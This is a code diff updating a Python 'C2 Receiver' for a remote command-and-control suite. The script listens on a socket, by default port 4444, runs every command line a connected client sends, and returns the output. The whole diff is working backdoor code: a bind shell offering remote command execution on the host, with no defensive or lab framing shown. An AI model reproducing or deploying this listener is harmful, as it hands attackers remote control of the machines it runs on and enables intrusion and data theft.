@@ -7,13 +7,13 @@ import argparse
 
 def main():
     # command line arguments
-    parser = argparse.ArgumentParser(prog="C2 Receiver", description="Receiver for Remote Command and Control Suite")
-    parser.add_argument("address", nargs='?', default='127.0.0.1', help="IP Address of this machine (default: %(default)s)")
-    parser.add_argument("port", nargs='?', type=int, default=4444, help="Port to listen on (default: %(default)s)")
+    parser = argparse.ArgumentParser(description="Receiver for Remote Command and Control Suite")
+    parser.add_argument("address", nargs='?', default='localhost', help="IP Address of this machine (optional, default: %(default)s)")
+    parser.add_argument("port", nargs='?', type=int, default=4444, help="Port to listen on (optional, default: %(default)s)")
     args = parser.parse_args()
 
     # Create a socket object
-    server_socket = socket.socket()
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     # Bind the socket to the host and port
@@ -21,7 +21,7 @@ def main():
 
     # Listen for incoming connections
     server_socket.listen(1)
-    print("Server listening on {}:{}".format(args.address, args.port))
+    print("Server listening on {}:{}".format(*server_socket.getsockname()))
     
     # wait for first connection
     client_socket, client_address = server_socket.accept()
@@ -32,27 +32,29 @@ def main():
         if len(received_data) > 0:
 
             received_message = received_data.decode()
-
-            # print("message :", received_message)
-            
             args = shlex.split(received_message)
-            # print(args)
 
             # special case because cd is a shell built-in
             if args[0] == 'cd':
                 os.chdir(args[1])
-                client_socket.send("[*] Changed current directory to {}\n".format(os.getcwd()).encode())
+                client_socket.send(" \b".encode())
             else:
-                # proc = subprocess.run(args, capture_output=True, text=True)
-                proc = subprocess.check_output(args, stderr=subprocess.STDOUT, shell=True)
+                try:
+                    proc = subprocess.run(args, capture_output=True, check=True)
 
-                if len(proc) > 0:
-                    client_socket.sendall(proc)
-                else:
-                    client_socket.send("[*] Executed successfully\n".encode())
+                    if len(proc.stdout) > 0:
+                        client_socket.sendall(proc.stdout)
+                    else:
+                        client_socket.send(" \b".encode())
+                except subprocess.CalledProcessError as error:
+                    client_socket.send(error.stderr)
+                except OSError:
+                    client_socket.send("Command not found\n".encode())
+                except Exception as e:
+                    client_socket.send("---UNHANDLED EXCEPTION -> {}".format(str(e)).encode())
+
         else:
-            # if no data was received, or if the client closed the connection,
-            # reset the socket
+            # if no data was received, or if the client closed the connection, reset the socket
             client_socket.close()
             client_socket, client_address = server_socket.accept()
 
